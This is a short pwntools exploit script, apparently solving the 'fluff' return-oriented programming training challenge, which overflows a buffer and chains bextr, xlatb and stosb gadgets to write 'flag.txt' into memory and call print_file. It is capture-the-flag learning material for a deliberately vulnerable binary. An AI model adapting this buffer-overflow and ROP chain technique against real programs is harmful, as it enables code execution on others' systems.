from pwn import *

exe = ELF("./fluff", checksec=False)
p = process(exe.path)

#grep -oba '<char>' ./fluff -> find char address (offset)
char_addr = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x4003e0, 0x400246, 0x4003e0]
last_char = [0x0b, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78]
BSS_ADDR = exe.bss()

# gadget
POP_RCX_RDX_BEXTR_RBX_RCX_RDX = 0x40062a    #0x000000000040062b: pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
XLATB = 0x400628    #0x0000000000400628 : xlatb ; ret -> al = byte ptr [rbx + al]
STOSB = 0x400639    #0x0000000000400639 : stosb byte ptr [rdi], al ; ret -> [rdi] = al; rdi++
POP_RDI = 0x4006a3  #0x00000000004006a3 : pop rdi ; ret

file = b'flag.txt'

payload = b'A' * 40

for i in range(len(file)):
    payload += p64(POP_RCX_RDX_BEXTR_RBX_RCX_RDX)
    payload += p64(0x4000)
    payload += p64(char_addr[i] - last_char[i] - 0x3ef2) # offset from last char
    payload += p64(XLATB)
    payload += p64(POP_RDI)
    payload += p64(BSS_ADDR + i)
    payload += p64(STOSB)

payload += p64(POP_RDI)
payload += p64(BSS_ADDR)
payload += p64(exe.symbols['print_file'])

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)